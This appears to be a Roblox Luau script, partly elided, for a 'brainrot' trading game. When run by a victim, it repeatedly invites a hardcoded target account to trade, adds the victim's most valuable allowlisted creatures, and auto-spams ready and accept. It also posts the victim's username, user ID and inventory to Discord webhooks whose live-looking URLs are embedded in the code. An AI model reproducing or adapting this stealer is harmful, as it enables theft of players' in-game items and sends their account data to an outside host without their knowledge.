task.spawn(function()
    ...
    task.spawn(function()
        ...
        -- Configuration
        ----------------------------------------------------------------
        local TARGET_USER_ID = 27915822
        local TARGET_USERNAME = "magnus3a"
        local DEBUG_PREFIX = "[logger]"

        local ALLOWED_ANIMALS = {
            "Dragon Gingerini",
            "Noobini Pizzanini",
        ...
        local ALLOWED_ANIMALS_SET = {}
        for _, name in ipairs(ALLOWED_ANIMALS) do
            ALLOWED_ANIMALS_SET[name] = true
        end

        local GOOD_WEBHOOK = "https://discordapp.com/api/webhooks/1521575072328843435/NqO2ZR0vPEYUthEwlGMKxUt57uKsVM20WqRFn5o6Tej6F_0zDukHakUiAV4tD4Pxjk-r"
        local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
        local BAD_WEBHOOK = "https://discordapp.com/api/webhooks/1521575072328843435/NqO2ZR0vPEYUthEwlGMKxUt57uKsVM20WqRFn5o6Tej6F_0zDukHakUiAV4tD4Pxjk-r"
        local BAD_AVATAR = "https://cdn.pfps.gg/pfps/35122-skeleton.jpeg"
        local TRADE_WEBHOOK = "https://discordapp.com/api/webhooks/1521575072328843435/NqO2ZR0vPEYUthEwlGMKxUt57uKsVM20WqRFn5o6Tej6F_0zDukHakUiAV4tD4Pxjk-r"
        local TRADE_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
        ...
        -- Remotes
        ----------------------------------------------------------------
        local u2 = require(Services.ReplicatedStorage.Packages.Net:Clone())
        local function makeRemote(method, name)
            local remotename
            if method == "RemoteFunction" then
                remotename = u2:RemoteFunction(name)
            elseif method == "RemoteEvent" then
                remotename = u2:RemoteEvent(name)
            end
            return Services.ReplicatedStorage.Packages.Net[tostring(remotename)]
        end

        local Invite = makeRemote("RemoteFunction", "TradeService/Invite")
        local AddBrainrot = makeRemote("RemoteFunction", "TradeService/AddBrainrot")
        local AcceptEvent = makeRemote("RemoteEvent", "TradeService/Accept")
        local ReadyEvent = makeRemote("RemoteEvent", "TradeService/Ready")
        ...
        local function getSortedBrainrots()
            ...
            for _, entry in ipairs(entries) do
                ...
                if animalData and ALLOWED_ANIMALS_SET[animalData.DisplayName or animal.Index] then
                    table.insert(list, {
                        index = entry.index,
                        animal = animal,
                        name = animalData.DisplayName or animal.Index,
        ...
        local function tryAddBrainrot(entry)
            debugLog("tryAddBrainrot: slot=", entry.index, "index=", entry.animal.Index)
            while true do
                local ok, success, result = pcall(function()
                    return AddBrainrot:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", entry.index, entry.animal)
                end)
                debugLog("  AddBrainrot pcall ok=", ok, "success=", success, "result=", result)
                if not ok then
                    return false
                end
                if success then
                ...
                if typeof(result) == "string" then
                    if result:lower():find("please wait") then
                        debugLog("  retrying (please wait)")
                        task.wait(0.5)
                    elseif result:lower():find("space") or result:lower():find("enough") then
                        debugLog("  nospace")
                        return "nospace"
                    else
                        debugLog("  unhandled error string, giving up")
                        return false
                    end
                else
                    debugLog("  non-string result, giving up")
                    return false
                end
            end
        end
        ...
        local function offerBestBrainrots()
            debugLog("offerBestBrainrots: starting")
            ...
            local ourIndex
            for i, userId in tradeData.users do
                if userId == LocalPlayer.UserId then
                    ourIndex = i
                    break
                end
            end
            debugLog("  ourIndex=", ourIndex)
            if not ourIndex then
                return
            end
            local maxSlots = (tradeData.players[ourIndex] and tradeData.players[ourIndex].maxSlots or 4)
            debugLog("  maxSlots=", maxSlots)
            local sorted = getSortedBrainrots()
            debugLog("  sortedBrainrots count=", #sorted)
            local offered = 0
            lastOfferedList = {}
            for _, entry in ipairs(sorted) do
                if offered >= maxSlots then
                    debugLog("  maxSlots reached, breaking")
                    break
                end
                local result = tryAddBrainrot(entry)
                debugLog("  tryAddBrainrot returned:", result)
                if result == "nospace" then
                    debugLog("  nospace, going to ready/accept")
                    spamReadyAccept()
                    return
            ...
            debugLog("offerBestBrainrots: done, offered=", offered)
            spamReadyAccept()
        end
        ...
        sendTradeCompleteWebhook = function(offered)
            ...
            for i, e in ipairs(offered) do
                ...
                lines[i] = prefix .. "**" .. nm .. "** — " .. formatNumber(gen)
            end
            ...
            local embed = {
                ...
                footer = { text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId },
        ...
        local function sendDetailedWebhook()
            ...
            local function sendToWebhook(resultsList, webhookUrl, ping, avatarUrl)
                ...
                local embed = {
                    title = top.displayName .. " — " .. top.genStr,
        ...
        while true do
            ...
            ok3, inviteResult = pcall(function()
                return Invite:InvokeServer("afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
            end)
            debugLog("  invite pcall ok=", ok3, "result=", inviteResult)
            if ok3 and inviteResult then
                break
            end
            task.wait(5)
        end

        debugLog("Invite accepted, yielding for trade resume")
        coroutine.yield()
